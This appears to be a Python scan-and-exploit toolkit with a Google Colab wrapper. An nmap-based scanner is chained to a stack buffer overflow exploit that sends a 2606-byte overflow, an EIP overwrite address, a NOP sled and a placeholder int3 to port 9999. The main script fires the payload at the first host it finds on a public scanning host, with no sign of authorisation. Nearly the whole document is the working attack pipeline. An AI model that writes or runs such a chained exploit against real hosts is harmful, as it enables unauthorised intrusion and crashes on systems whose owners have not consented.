```python
# scanner.py
import nmap

class NetworkScanner:
    def __init__(self):
        self.nm = nmap.PortScanner()

    def scan(self, target):
        self.nm.scan(target, '1-1024')
        return self.nm.all_hosts()

# exploit.py
import socket

class Exploit:
    def __init__(self, target, port):
        self.target = target
        self.port = port

    def create_payload(self):
        # Buffer overflow payload
        buffer = b"A" * 2606
        eip = b"\xB4\x10\x50\x62"  # Address to overwrite EIP
        payload = buffer + eip + b"\x90" * 16 + b"\xcc"  # NOP sled and a simple interrupt (int3)
        return payload

    def send_payload(self, payload):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target, self.port))
            s.send(payload)
            s.close()
            print("Payload sent successfully")
        except Exception as e:
            print(f"Failed to send payload: {e}")

# main.py
from scanner import NetworkScanner
from exploit import Exploit

def main():
    # Step 1: Scan network
    scanner = NetworkScanner()
    target = 'scanme.nmap.org'
    hosts = scanner.scan(target)
    print(f"Hosts found: {hosts}")

    if hosts:
        # Step 2: Exploit target
        target_host = hosts[0]
        target_port = 9999  # Example port
        exploit = Exploit(target_host, target_port)
        payload = exploit.create_payload()
        exploit.send_payload(payload)

if __name__ == "__main__":
    main()

# Script to run in Google Colab
!pip install python-nmap

import os

# Create scanner.py
scanner_code = '''
import nmap

class NetworkScanner:
    def __init__(self):
        self.nm = nmap.PortScanner()

    def scan(self, target):
        self.nm.scan(target, '1-1024')
        return self.nm.all_hosts()

if __name__ == "__main__":
    scanner = NetworkScanner()
    target = 'scanme.nmap.org'
    hosts = scanner.scan(target)
    print(f"Hosts found: {hosts}")
'''

# Write scanner.py to file
with open('scanner.py', 'w') as f:
    f.write(scanner_code)

# Create exploit.py
exploit_code = '''
import socket

class Exploit:
    def __init__(self, target, port):
        self.target = target
        self.port = port

    def create_payload(self):
        # Buffer overflow payload
        buffer = b"A" * 2606
        eip = b"\\xB4\\x10\\x50\\x62"  # Address to overwrite EIP
        payload = buffer + eip + b"\\x90" * 16 + b"\\xcc"  # NOP sled and a simple interrupt (int3)
        return payload

    def send_payload(self, payload):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target, self.port))
            s.send(payload)
            s.close()
            print("Payload sent successfully")
        except Exception as e:
            print(f"Failed to send payload: {e}")

if __name__ == "__main__":
    target = '127.0.0.1'
    port = 9999
    exploit = Exploit(target, port)
    payload = exploit.create_payload()
    exploit.send_payload(payload)
'''

# Write exploit.py to file
with open('exploit.py', 'w') as f:
    f.write(exploit_code)

# Create main.py
main_code = '''
from scanner import NetworkScanner
from exploit import Exploit

def main():
    # Step 1: Scan network
    scanner = NetworkScanner()
    target = 'scanme.nmap.org'
    hosts = scanner.scan(target)
    print(f"Hosts found: {hosts}")

    if hosts:
        # Step 2: Exploit target
        target_host = hosts[0]
        target_port = 9999  # Example port
        exploit = Exploit(target_host, target_port)
        payload = exploit.create_payload()
        exploit.send_payload(payload)

if __name__ == "__main__":
    main()
'''

# Write main.py to file
with open('main.py', 'w') as f:
    f.write(main_code)

# Run the main script
os.system('python main.py')
```
